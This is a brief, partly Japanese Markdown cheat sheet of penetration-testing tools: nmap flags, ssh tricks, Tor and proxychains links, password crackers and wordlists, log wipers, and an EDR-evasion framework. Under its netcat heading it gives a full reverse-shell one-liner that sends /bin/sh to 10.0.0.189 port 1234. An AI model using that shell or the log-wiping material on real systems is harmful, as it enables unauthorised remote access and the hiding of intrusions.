# Tools

### nmap

https://nmap.org/

https://orebibou.com/ja/home/201506/20150603_001/

スクリプト：/usr/share/nmap/scripts

```bash
# 頻出ポートの一覧 (上位100)
nmap --top-ports 100 -oG - -v -sSU

# ポートスキャンしない：-Pn
# 名前解決しない：-n
# TCP -sT
# SYN -sS
# UDP -sU

# cheat sheet
curl cheat.sh/nmap
```

### ssh

リモートホストにコピー

```bash
cat file1 | ssh -f user@server 'cd $HOME; cat > file1'
```

踏み台設定

```txt
cat ~/.ssh/config
Host host2
     ProxyCommand ssh host1 nc %h %p
```

### Tor Browser

https://www.torproject.org/

[How To Access The Dark Web: What Is Tor And How Do I Access Dark Websites?](https://www.alphr.com/technology/1002667/how-to-access-the-dark-web-what-is-tor-and-how-do-i-use-it/#:~:text=Tor%20is%20an%20anonymity%20network,re%20logged%20into%20a%20website.)

[How To Use Tor Browser: Everything You MUST Know in 2021](https://www.vpnmentor.com/blog/tor-browser-work-relate-using-vpn/)

[Tor over VPN: Is it useful if you’re not a whistleblower?](https://cybernews.com/what-is-vpn/tor-over-vpn/)

### proxychains & tor

https://linuxhint.com/proxychains-tutorial/

https://www.geeksforgeeks.org/how-to-setup-proxychains-in-linux-without-any-errors/

### password

- 辞書ファイル、パスワードリスト
  - https://download.openwall.net/pub/wordlists/
- password cracker
  - https://www.openwall.com/john/
  - https://github.com/vanhauser-thc/thc-hydra
- password recovery
  - https://en.wikipedia.org/wiki/Cain_and_Abel_(software)

### log wipers

https://packetstormsecurity.com/UNIX/penetration/log-wipers

```bash
# current login users (utmp)
who
w

# login users info (wtmp)
last
ac -p

# last login users (lastlog)
lastlog
```

### netcat

```bash
rm /tmp/pipe; mkfifo /tmp/pipe; cat /tmp/pipe|/bin/sh -i 2>&1|nc 10.0.0.189 1234 > /tmp/pipe
```

### Services & Apps

https://www.crowdstrike.com/

https://chronicle.security/

https://www.fireeye.com/

https://www.darktrace.com/

https://www.blackberry.com/

https://www.menlosecurity.com/

https://www.shodan.io/

https://github.com/optiv/ScareCrow
